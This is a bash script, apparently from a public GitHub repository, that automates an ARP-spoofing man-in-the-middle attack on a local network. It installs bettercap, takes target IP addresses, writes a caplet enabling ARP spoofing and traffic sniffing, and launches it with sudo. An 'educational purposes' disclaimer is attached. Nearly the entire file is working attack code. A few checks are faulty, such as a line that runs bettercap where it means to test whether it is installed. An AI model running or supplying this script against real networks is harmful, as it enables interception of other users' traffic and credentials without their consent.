#!/usr/bin/bash
# Wrote at 9/3/2023
# BY @amgadcyber
# A helper script that will spoof and sniff devices in local network
# IT IS MITM attack, and is only for those who seek knowledge, and 
# IT IS FOR EDUCATIONAL PURPOSES, USE IT AT YOUR OWN RISK.

# Script Info
name="ARP AUTO SPOOF && SNIFF SCRIPT"
author="AMGAD CYBER"
repo="https://github.com/amgadcyber/YaHelper"

# Script Variables
os="$(uname)"
distribution="$(cat /etc/os-release | grep '\bID\b' | sed 's/ID=//')"  
bettercap_cmd=$(bettercap)
cap_file="$(hostname)_bettercap.cap"
# Router vars
getaway_ip=$(route -n | grep 'UG [ \t]' | awk '{print $2}')
current_ip=$(ip r  | awk '/^def/{print $9}')

# Author
echoAbout() {
   echo "A helper script that will spoof and sniff devices in local network"
   echo "IT IS MITM attack, and is only for those who seek knowledge, so IT IS FOR EDUCATIONAL PURPOSES, USE IT AT YOUR OWN RISK."
   echo '================================================================'
   echo "Script By $author"
   echo "Script Name $name"
   echo "Source Code $repo"
   echo '================================================================'
}

# install bettercap
install_bettercap() { 
   # check if it is Linux
   if [ "$os" = "Linux" ]; then
      # if distribution is debian, Install through apt manager
      if [ "$distribution" = "debian" ]; then
            echo "//////////////////////////////////////" 
            echo "Linux runs debian Distribution"
            echo "bettercap is not installed, we'll install it for you"
            echo "press Enter to continue, otherwise press Ctrl+C to cancel"
            read -s  
            echo "Installing though the apt manager"
            echo "[1] Running apt update ..."
            sudo apt update 
            echo "[2] Installing bettercap"
            sudo apt install bettercap -y
            echo "[DONE] bettercap is Installed"
      fi 
   fi        
} 

# Check if bettercap is installed 
check_bettercap() {
   if [ -z "$bettercap_cmd" ]; then 
         install_bettercap
     else 
        echo "Oh, Yeah, bettercap is Installed" 
   fi
}

# Starting..
echoAbout
# Print Info on the terminal
echo "OS: $os   DISTRO: $distribution"
echo "IP: $current_ip     GETAWAY: $getaway_ip"
echo '================================================================'
echo '================================================================'
# if info is correct- ask the user to continue or not
echo "Check whether the info above is correct or not"
echo "Press Enter to Continue"
read -s
check_bettercap


# setting the config file for you
sleep 1
echo "Enter the IP address of the targets Device in the Local Network"
echo "Remember you can seperate ip with a comma , 192.168.1.1, 192.168.1.2"
echo "And Press Enter to Continue"
read -p "Targets: " targets_IP
echo "Setting up the config file or overwrite it if exists"
echo "the file will be created in the same directory of this script"
cat << EOF > $cap_file
net.probe on
set arp.spoof.targets $targets_IP
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
EOF
echo '==========================='
echo 'FILE SAVE AS' $cap_file
echo '==========================='
# file is there or not 
if [ -z $cap_file ]; then
   echo '==========================='
   echo $cap_file 'Does Not Exist'
   echo '==========================='
fi

# Running bettercap
echo "Running bettercap based on the config file"
echo "Starting..."
echo ""
sudo bettercap -caplet $cap_file
echoAbout
echo "Good Bye! :)"
exit 0